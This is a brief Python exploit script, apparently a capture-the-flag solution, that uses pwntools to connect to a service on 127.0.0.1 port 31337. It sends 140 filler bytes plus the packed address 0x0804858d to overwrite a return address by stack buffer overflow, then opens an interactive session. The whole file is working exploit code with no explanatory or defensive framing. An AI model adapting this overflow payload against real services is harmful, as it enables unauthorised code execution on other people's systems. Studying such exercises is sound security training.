#!usr/bin/python
from pwn import *

# using pwn tools
# overflow found at 140 to first entry, and address of success is 0x0804858d

port = 31337
host = "127.0.0.1"

p = remote(host, port)

# clear through the headers

p.recvlines(3)

# the exploit
address = p32(0x0804858d)
exploit = "A"*140+address

# send it
p.sendline(exploit)

#go interactive
p.interactive()
